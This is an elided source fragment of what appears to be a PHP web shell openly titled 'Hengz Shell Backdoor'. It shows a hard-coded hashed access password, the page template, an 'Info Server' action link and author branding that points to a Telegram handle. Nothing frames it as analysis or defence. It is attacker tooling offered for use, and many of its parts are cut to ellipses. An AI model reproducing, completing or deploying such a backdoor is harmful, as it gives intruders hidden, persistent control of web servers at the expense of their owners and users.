...
$password 			= "c2d14c844b2db64f7013917e156c51a5";   
$color 				= "#00ff00";
...
<html lang="en">
  <head>
    ...
    <meta charset="utf-8">
		...
		<meta name='author' content='Hengz'/>
		<meta name='author' content='Hengz'/>
		<meta name='copyright' content='Hengz'/>
		<meta name='description' content='Hengz Shell Backdoor'>
    ...
    <title>Hengz Shell Backdoor</title>
    <style>
    	body{
  ...
  <body class="text-white">
    <div class="p-3">
    	<h2 class="text-center">Hengz</h2><hr>
    	...
    	<hr>
    	<center>
    		<small>Copyright &copy; <a href="https://t.me/sztsss">Hengz</a></small>
    	</center>
    </div>
...
<a href='?dir=$dir&aksi=InfoServer' class='fiture btn btn-info btn-sm btn-block mt-2'>Info Server</a>
		...
		<div class=''>
			<h1 class='text-center'><a href='https://t.me/sztsss'>[+]Hengz Xploiter[+]</h1>
